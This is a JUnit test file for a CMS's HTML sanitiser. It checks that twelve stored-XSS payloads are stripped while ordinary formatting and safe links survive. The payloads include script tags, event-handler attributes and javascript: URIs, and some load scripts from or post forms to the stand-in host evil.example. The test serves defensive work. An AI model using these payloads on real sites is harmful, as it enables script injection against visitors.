package com.hatis.platform.cms.application;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * HTML sanitising.
 *
 * <p>A CMS stores what an editor writes and serves it to every visitor of the
 * customer's site, so this is the stored-XSS boundary. Each case below is a payload
 * that has worked in the wild.
 */
class RichTextSanitizerTest {

    @ParameterizedTest
    @ValueSource(strings = {
            "<script>alert(1)</script>",
            "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=//evil.example></iframe>",
            "<form action=//evil.example><input name=p></form>",
            "<a href=\"javascript:alert(1)\">x</a>",
            "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
            "<div style=\"background:url(javascript:alert(1))\">x</div>",
            "<object data=//evil.example></object>",
            "<embed src=//evil.example>",
            "<body onload=alert(1)>x</body>"
    })
    @DisplayName("executable content is removed")
    void removesExecutableContent(String payload) {
        String sanitized = RichTextSanitizer.sanitize(payload);

        assertThat(sanitized.toLowerCase())
                .doesNotContain("<script")
                .doesNotContain("onerror")
                .doesNotContain("onload")
                .doesNotContain("<iframe")
                .doesNotContain("<form")
                .doesNotContain("<object")
                .doesNotContain("<embed")
                .doesNotContain("javascript:");
    }

    @Test
    @DisplayName("ordinary editorial formatting survives")
    void preservesFormatting() {
        String sanitized = RichTextSanitizer.sanitize(
                "<h1>Title</h1><p>A <strong>bold</strong> and <em>italic</em> paragraph.</p>"
                        + "<ul><li>one</li><li>two</li></ul>"
                        + "<blockquote>quoted</blockquote>");

        assertThat(sanitized)
                .contains("<h1>Title</h1>")
                .contains("<strong>bold</strong>")
                .contains("<em>italic</em>")
                .contains("<li>one</li>")
                .contains("<blockquote>quoted</blockquote>");
    }

    @Test
    @DisplayName("safe links and images keep their targets")
    void preservesSafeLinksAndImages() {
        String sanitized = RichTextSanitizer.sanitize(
                "<a href=\"https://example.com/page\">link</a>"
                        + "<img src=\"https://cdn.example.com/a.png\" alt=\"a\">");

        assertThat(sanitized).contains("https://example.com/page").contains("https://cdn.example.com/a.png");
    }

    @Test
    @DisplayName("plain text becomes searchable text with no markup")
    void flattensToPlainText() {
        assertThat(RichTextSanitizer.toPlainText("<p>Hello <strong>world</strong></p>"))
                .isEqualTo("Hello world");
    }

    @Test
    @DisplayName("empty and null input are handled without throwing")
    void handlesEmptyInput() {
        assertThat(RichTextSanitizer.sanitize(null)).isEmpty();
        assertThat(RichTextSanitizer.sanitize("   ")).isEmpty();
        assertThat(RichTextSanitizer.toPlainText(null)).isEmpty();
    }
}
